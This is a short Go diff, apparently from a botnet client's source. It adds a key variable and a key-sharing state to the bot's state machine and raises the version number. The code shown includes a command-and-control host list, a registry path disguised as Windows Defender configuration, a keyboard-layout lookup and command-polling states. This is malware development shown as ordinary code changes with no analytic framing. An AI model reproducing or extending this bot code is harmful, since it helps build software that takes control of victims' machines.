@@ -49,6 +49,7 @@ var (
 
 	g_guid        = ""
 	g_token       = ""
+	g_key         = ""
 	g_regpath     = `Software\WinDefConfig`
 	g_installdate = ""
 
@@ -76,7 +77,7 @@ var (
 	pfnGetKeyboardLayout    = user32.NewProc("GetKeyboardLayout")
 
 	botcore = BotCore{
-		version:       "1.8.8",
+		version:       "1.9.8",
 		hosts:         []string{"127.0.0.1:8080"},
 		singleton:     true,
 		sington_mutex: 0,
@@ -104,6 +105,7 @@ const (
 	StateReadGuid BotState = iota
 	StateGenGuid
 	StateReadToken
+	StateShareKey
 	StateRecoverPoll
 	StateCommandPoll
 	StateError
